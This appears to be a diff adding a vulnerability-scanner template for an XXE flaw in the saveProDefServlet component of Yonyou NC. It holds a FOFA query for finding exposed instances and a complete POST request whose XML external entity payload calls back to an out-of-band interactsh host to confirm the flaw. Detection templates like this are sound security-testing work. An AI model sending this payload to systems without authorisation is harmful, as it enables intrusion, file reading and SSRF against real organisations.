@@ -1,0 +1,30 @@
+id: yonyou-nc-saveprodefservlet-xxe
+info:
+  name: "用友 NC saveProDefServlet 组件 XML 外部实体注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="用友-UFIDA-NC"
+          用友NC由用友公司开发的集成化企业管理平台，覆盖财务核算、供应链管理及生产执行等核心业务模块。该系统saveProDefServlet组件存在XML外部实体注入（XXE）安全缺陷，攻击者可构造特制XML数据通过该接口触发实体解析，实现服务器本地文件读取或发起SSRF攻击，最终导致敏感数据泄露及系统权限突破。
+  tags: 用友NC
+http:
+- raw:
+  - |
+    POST /portal/pt/servlet/saveProDefServlet/doPost?pageId=login HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    prodefxml=$<Url:GB2312>$<Url:GB2312><?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE root [
+    <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
+    %remote;]>
+    <root/></Url>$</Url>$
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
